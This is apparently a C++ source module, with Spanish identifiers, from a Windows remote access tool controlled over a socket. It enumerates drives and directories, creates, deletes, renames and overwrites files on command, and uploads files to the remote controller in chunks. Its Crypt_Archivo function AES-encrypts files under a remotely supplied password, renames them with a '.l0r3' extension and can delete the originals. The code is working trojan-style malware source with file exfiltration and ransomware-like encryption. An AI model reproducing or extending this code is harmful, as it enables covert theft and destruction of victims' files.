#include "mod_file_manager.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

std::vector<struct sDrives> Drives() {
	std::vector<struct sDrives> vcOutput;
	char cDrives[512];
	memset(cDrives, 0, sizeof(cDrives));
	int iRet = GetLogicalDriveStrings(sizeof(cDrives), cDrives);
	if (iRet > 0) {
		char* p1 = cDrives;
		char* p2;
		while (*p1 != '\0' && (p2 = strchr(p1, '\0')) != nullptr) {
			char cLabel[128]; memset(cLabel, '\0', 128);
			char cType[128]; memset(cType, '\0', 128);
			iRet = GetVolumeInformationA(p1, cLabel, 128, nullptr, nullptr, nullptr, cType, 128);
			if (strlen(cLabel) <= 0) {
				UINT dt = GetDriveTypeA(p1);
				switch (dt) {
				case 0:
					strncpy(cLabel, "Desconocido", 12);
					break;
				case 1:
					strncpy(cLabel, "Volumen no montado", 19);
					break;
				case 2:
					strncpy(cLabel, "USB", 5);
					break;
				case 3:
					strncpy(cLabel, "Disco Duro", 11);
					break;
				case 4:
					strncpy(cLabel, "Disco Remoto", 13);
					break;
				case 5:
					strncpy(cLabel, "CD-ROM", 7);
					break;
				case 6:
					strncpy(cLabel, "RAM Disk", 9);
					break;
				default:
					strncpy(cLabel, "Desconocido", 12);
					break;
				}
			}
			struct sDrives sDrive;
			if (iRet != 0) {
				__int64 FreeBytesAvaiableToUser, TotalFreeBytes;
				GetDiskFreeSpaceEx(p1, (PULARGE_INTEGER)&FreeBytesAvaiableToUser, (PULARGE_INTEGER)&TotalFreeBytes, nullptr);
				double dFreegigs = (((double)(FreeBytesAvaiableToUser / 1024) / 1024) / 1024);
				double dTotalgigs = (((double)(TotalFreeBytes / 1024) / 1024) / 1024);
				strncpy(sDrive.cLetter, p1, 10);
				strncpy(sDrive.cLabel, cLabel, 50);
				strncpy(sDrive.cType, cType, 20);
				sDrive.dFree = dFreegigs;
				sDrive.dTotal = dTotalgigs;
			}
			else {
				strncpy(sDrive.cLetter, p1, 10);
				strncpy(sDrive.cLabel, cLabel, 50);
				strncpy(sDrive.cType, "-", 2);
				sDrive.dFree = 0;
				sDrive.dTotal = 0;
			}
			vcOutput.push_back(sDrive);
			p1 = p2 + 1;
		}

	}

	return vcOutput;

}

std::vector<std::string> vDir(c_char* cPath) {
	std::vector<std::string> vcFolders;
	std::vector<std::string> vcFiles;
	
	WIN32_FIND_DATA win32Archivo;
	struct stat info;

	TCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	snprintf(szDir, MAX_PATH, "%s*", cPath);
	SYSTEMTIME FileDate;
	char cFecha[15];
	char cTmpdir[2048];
	hFind = FindFirstFileA(szDir, &win32Archivo);

	if (!hFind) {
		__DBG_("No se pudo listar el directorio " + std::string(szDir));
		return vcFolders;
	}
	do {
		//cFecha tmpdir baia.cFileName win32Archivo.nFilesizeLow

		FileTimeToSystemTime(&win32Archivo.ftCreationTime, &FileDate);
		
		ZeroMemory(cFecha, sizeof(cFecha));
		ZeroMemory(cTmpdir, sizeof(cTmpdir));

		snprintf(cFecha, 15, "%d/%d/%d", FileDate.wDay, FileDate.wMonth, FileDate.wYear);
		
		strncpy(cTmpdir, cPath, 2047);
		strncat(cTmpdir, win32Archivo.cFileName, 2047 - strnlen(cTmpdir, 2047));
		
		stat(cTmpdir, &info);

		std::string strEntry = "";

		if (info.st_mode & S_IFDIR) {
			//Directorio
			strEntry = "0>";
			strEntry += win32Archivo.cFileName;
			strEntry += ">->";
			strEntry += cFecha;
			vcFolders.push_back(strEntry);
		} else {
			strEntry = "0<";
			strEntry += win32Archivo.cFileName;
			strEntry += "<";
			strEntry += std::to_string(win32Archivo.nFileSizeLow);
			strEntry += "<";
			strEntry += cFecha;
			vcFiles.push_back(strEntry);

		}

	} while (FindNextFile(hFind, &win32Archivo) != 0);
	
	if (hFind) {
		FindClose(hFind);
	}

	for (auto item : vcFiles) {
		vcFolders.push_back(item);
		
	}

	return vcFolders;
}

void CrearFolder(c_char* cPath) {
	CreateDirectoryA(static_cast<LPCSTR>(cPath), nullptr);
}

void CrearArchivo(c_char* cPath) {
	HANDLE hNewFile = CreateFileA(static_cast<LPCSTR>(cPath), GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, 
		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hNewFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hNewFile);
		hNewFile = nullptr;
	}
}

void BorrarArchivo(c_char* cPath) {
	DeleteFile(static_cast<LPCSTR>(cPath));
}

void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
	if (!MoveFile(static_cast<LPCSTR>(cPath), static_cast<LPCSTR>(cNuevoNombre))) {
		error();
		__DBG_("Error renombrando archivo");
		__DBG_(std::string(cPath) + "|" + std::string(cNuevoNombre));
	}
}

void BorrarFolder(c_char* cPath) {
	RemoveDirectoryA(static_cast<LPCSTR>(cPath));
}

void EditarArchivo_Guardar(const std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
	__DBG_("[!] Guardando archivo [remote-edit]: " + strPath);
	
	std::ofstream localFile(strPath, std::ios::binary);
	if (!localFile.is_open()) {
		__DBG_("No se pudo abrir el archivo " + strPath);
		return;
	}

	localFile.write(cBuffer, iBufferSize);

	size_t iFinal = localFile.tellp();
	__DBG_("[!] " + std::to_string(iFinal) + " escritos");


	localFile.flush();
	localFile.close();

}

void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit) {
	__DBG_("[ID-" + cID + "]Enviando " + cPath);
	
	std::ifstream localFile(cPath, std::ios::binary);
	if (!localFile.is_open()) {
		__DBG_("No se pudo abrir el archivo " + cPath);
		return;
	}

	u64 uTamArchivo = GetFileSize(cPath.c_str());
	u64 uBytesEnviados = 0;

	std::string strComando = cID;
	strComando.append(1, CMD_DEL);
	strComando += std::to_string(uTamArchivo);
	
	int iPaqueteTipo = EnumComandos::FM_Editar_Archivo_Paquete;
	if (!isEdit) {
		cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_Init);
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
		iPaqueteTipo = EnumComandos::FM_Descargar_Archivo_Recibir;
	}

	std::string strHeader = cID;
	strHeader.append(1, CMD_DEL);
	
	int iHeaderSize = strHeader.size();
	int iBytesLeidos = 0;

	std::vector<char> nSendBuffer(CHUNK_FILE_TRANSFER_SIZE + iHeaderSize);
	if (nSendBuffer.size() == 0) {
		__DBG_("[FM]No se pudo reservar memoria para enviar el archivo - 2");
		return;
	}

	memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);

	while (1) {
		localFile.read(nSendBuffer.data() + iHeaderSize, CHUNK_FILE_TRANSFER_SIZE);
		iBytesLeidos = localFile.gcount();
		if (iBytesLeidos > 0) {
			iBytesLeidos += iHeaderSize;
			
			int iEnviado = cCliente->cChunkSend(cCliente->sckSocket, nSendBuffer.data(), iBytesLeidos, 0, true, nullptr, iPaqueteTipo);

			uBytesEnviados += iEnviado;

			if (iEnviado == -1 || iEnviado == WSAECONNRESET) {
				//No se pudo enviar el paquete
				break;
			}
		} else {
			break;
		}
	}

	localFile.close();

	//Ya se envio todo, cerrar el archivo
	if (!isEdit) {
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
		cCliente->cChunkSend(cCliente->sckSocket, cID.c_str(), cID.size(), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_End);
	}
}

void Crypt_Archivo(const std::string strPath, const char cCryptOption, const char cDelOption, const std::string strPass) {
	std::string strComando = "";
	// 1 = No se pudo abrir archivo entrada
	// 2 = ""  "" ""   ""    ""      salida
	// 3 = success

	ByteArray bKey;
	ByteArray bOutput;
	ByteArray::size_type out_len;
	for (auto cChar : strPass) {
		bKey.push_back(cChar);
	}

	//Read file buffer
	u64 uFileSize = GetFileSize(strPath.c_str());

	std::ifstream archivo(strPath, std::ios::binary);
	if (!archivo.is_open()) {
		__DBG_("[CRYPT] ERR IN " + strPass);
		cCliente->cChunkSend(cCliente->sckSocket, "1", 1, 0, true, nullptr, EnumComandos::FM_Crypt_Confirm);
		return;
	}

	std::vector<char> cBuffer(uFileSize);
	archivo.read(cBuffer.data(), uFileSize);

	if (cCryptOption == '0') {
		//Cifrar
		out_len = Aes256::encrypt(bKey, reinterpret_cast<const unsigned char*>(cBuffer.data()), uFileSize, bOutput);
	}else if (cCryptOption == '1') {
		//Descifrar
		out_len = Aes256::decrypt(bKey, reinterpret_cast<const unsigned char*>(cBuffer.data()), uFileSize, bOutput);
	}

	archivo.close();

	std::string strOut = (cCryptOption == '0') ? strPath + ".l0r3" : strPath.substr(0, strPath.size() - 5);

	std::ofstream archivo_out(strOut, std::ios::binary);

	if (archivo_out.is_open()) {
		archivo_out.write(reinterpret_cast<const char*>(bOutput.data()), out_len);
		archivo_out.close();
		strComando = "3";
	}else {
		__DBG_("[CRYPT] ERR OUT " + strOut);
		strComando = "2";
	}

	if (cDelOption == '1') {
		BorrarArchivo(strPath.c_str());
	}

	cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), 1, 0, true, nullptr, EnumComandos::FM_Crypt_Confirm);
}